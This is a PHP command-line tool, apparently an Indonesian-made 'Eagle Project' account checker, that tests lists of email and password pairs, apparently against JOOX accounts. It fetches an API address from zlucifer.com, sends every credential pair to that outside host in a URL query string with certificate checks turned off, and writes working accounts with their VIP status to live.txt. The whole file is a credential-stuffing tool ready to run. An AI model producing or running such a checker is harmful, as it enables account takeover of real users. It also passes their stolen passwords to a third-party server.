<?php
error_reporting(0);
/*
///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////
////                       _            _  __                              ////
////                      | |          (_)/ _|                             ////
////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
////                   / /| | |_| | (__| | ||  __/ |                       ////
////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
////                                                                       ////
///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////
*/
    echo "  ===============================\n";
    echo "          _.-'`)     (`'-._ \n";
    echo "        .' -' / __    \ '- '. \n";
    echo "       / .-' ( '-,`|   ) '-. \ \n";
    echo "      / .-',-`'._/ \_.'`-,'-. \ \n";
    echo "     | | /.`'.-'(   )'-.'`.\ | | \n";
    echo "     | .-'|\//'-/   \-'::/|'-. | \n";
    echo "     |` |; :|'._\   /_,'|: :| `| \n";
    echo "     || : |;    `Y-Y`    :| : || \n";
    echo "     \:| :/======:=:======\| |:/ \n";
    echo "     /_:-`                 `-:_\ \n";
    echo "  ===============================\n";
    echo "  |        Eagle Project        |\n";
    echo "====================================\n";
    echo "Powered By : Hackbae\n";
    echo "====================================\n";
     $url_cek = "http://zlucifer.com/api/joox.php";
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url_cek);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
     curl_setopt($ch, CURLOPT_TIMEOUT, 10);
     $url_api = curl_exec($ch);
     curl_close($ch);
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url_api);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
     curl_setopt($ch, CURLOPT_TIMEOUT, 10);
     $cek_status = curl_exec($ch);
     curl_close($ch);
     $status = "off";
     if($cek_status === 'zLucifer'){
     $status = "on";
     }
            if(isset($argv[1])) {
                if(file_exists($argv[1])) {
                    $ambil = explode(PHP_EOL, file_get_contents($argv[1]));
                    foreach($ambil as $targets) {
                        $potong = explode("|", $targets);
                        if($status == "on"){
                        cekAkun($potong[0], $potong[1], $url_api);
                        }else{
                        echo "Kesalahan : Server offline";
                        }
                    }
                }else die("File doesn't exist!");
            }else die("CARA PAKAI : php check.php list.txt");
            function getStr($string, $start, $end){
                $str = explode($start,$string);
                $str = explode($end,$str[1]);
                return $str[0];
            }
            function cekAkun($email, $password, $url_api) {
                 $email = str_replace(' ','',$email);
                 $password = str_replace(' ','',$password);
                 $url_api = "$url_api?username=$email&password=$password";
                 $ch = curl_init();
                 curl_setopt($ch, CURLOPT_URL, $url_api);
                 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
                 curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                 $response = curl_exec($ch);
                 curl_close($ch);
                 if(preg_match('/LIVE/',$response)){
                    $cek = getStr($response,'(',')');
                    $zlucifer = $email." | ".$password." | VIP : ".$cek;
                    echo "LIVE | ".$zlucifer.PHP_EOL;
                    file_put_contents("live.txt", $zlucifer.PHP_EOL, FILE_APPEND);
                 }else if(preg_match('/DIE/',$response)){
                    $zlucifer = $email." | ".$password;
                    echo "DIE | ".$zlucifer.PHP_EOL;
                    file_put_contents("die.txt", $zlucifer.PHP_EOL, FILE_APPEND);
                 }else{
                    echo 'Kesalahan';
                    echo "\n";
                 }
            }
?>
